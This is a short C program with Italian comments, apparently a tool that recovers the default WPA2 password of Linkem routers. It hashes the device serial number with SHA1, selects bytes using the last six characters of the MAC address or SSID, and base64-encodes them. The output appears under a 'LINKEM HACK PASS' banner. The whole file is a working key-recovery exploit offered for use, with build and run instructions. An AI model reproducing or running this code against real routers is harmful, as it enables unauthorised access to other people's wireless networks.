/*
  Conpila con il comando:
      gcc linkem_pass.c -lcrypto -o linkem_pass
  Esegui con:
  ./a.out GMK170709001234 A1B285

*/

#include <stdio.h>
#include <string.h>
#include <openssl/sha.h>

const char base64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void upper_str(char s[]) {
    int i = 0;
    while (s[i] != '\0') {
        if (s[i] >= 'a' && s[i] <= 'z') {
            s[i] = s[i] - 32;
        }
        i++;
    }
}

void lower_str(unsigned char s[]) {
    int i = 0;
    while (s[i] != '\0') {
        if (s[i] >= 'A' && s[i] <= 'Z') {
            s[i] = s[i] + 32;
        }
        i++;
    }
}

size_t base64_enc_size(size_t inlen) {
    size_t ret;

    ret = inlen;
    if (inlen % 3 != 0)
        ret += 3 - (inlen % 3);
    ret /= 3;
    ret *= 4;

    return ret;
}

unsigned char *base64_enc(const unsigned char *in, unsigned char *out, size_t len) {
    size_t elen;
    size_t i;
    size_t j;
    size_t v;

    if (in == NULL || len == 0)
        return NULL;

    elen = base64_enc_size(len);
    out[elen] = '\0';

    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        v = in[i];
        v = i + 1 < len ? v << 8 | in[i + 1] : v << 8;
        v = i + 2 < len ? v << 8 | in[i + 2] : v << 8;

        out[j] = base64chars[(v >> 18) & 0x3F];
        out[j + 1] = base64chars[(v >> 12) & 0x3F];
        if (i + 1 < len) {
            out[j + 2] = base64chars[(v >> 6) & 0x3F];
        } else {
            out[j + 2] = '=';
        }
        if (i + 2 < len) {
            out[j + 3] = base64chars[v & 0x3F];
        } else {
            out[j + 3] = '=';
        }
    }

    return out;
}

unsigned char *wifi_pass(const unsigned char *serial, const unsigned char *halfmac, unsigned char *buf) {
    unsigned char pass_bin[6];
    unsigned char sha1_bin[SHA_DIGEST_LENGTH];
    int i, j;
    int lastpos = 0;
    int module = SHA_DIGEST_LENGTH;

    SHA1(serial, strlen(serial), sha1_bin);
    if (sha1_bin[0] != 0) {
        for (i = 1; i < SHA_DIGEST_LENGTH; i++) {
            if (sha1_bin[i] == 0) {
                module = i;
                break;
            }
        }
    }

    for (i = 0; i < 6; i++) {
        j = halfmac[i] - '0' + lastpos;
        j = j % module;
        pass_bin[i] = sha1_bin[j];
        lastpos = j;
    }

    base64_enc(pass_bin, buf, 6);
    lower_str(buf);
    return buf;
}


int main(int argc, char *argv[]) {
    char buf[SHA_DIGEST_LENGTH * 2];
    unsigned char passb64[20];

    if (argc != 3) {
        printf("Usa: %s seriale ultimi-3-cifre\n", argv[0]);
        printf("Esempio: %s GMK170210001234 A1B2C3\n", argv[0]);
        return -1;
    }

    if (strlen(argv[2]) != 6) {
        printf(" ERRORE: le ultime 3 cifre del MAC sono 6 caratteri (es. 'A1B2C3') oppure "
               "la parte finale del SSID (es. Linkem2.4Ghz_A1B2C3\n");
        return -1;
    }


    upper_str(argv[2]);
    memset(buf, 0x0, SHA_DIGEST_LENGTH * 2);

    wifi_pass((unsigned char *) argv[1], (unsigned char *) argv[2], passb64);

    printf("###LINKEM HACK PASS###\n");
    printf("S/N - Numero di serie:      %s\n", argv[1]);
    printf("LAN MAC - Ultime 3 cifre:   %s\n", argv[2]);
    printf("WPA2-Personal:              %s\n", passb64);

    return 0;

}
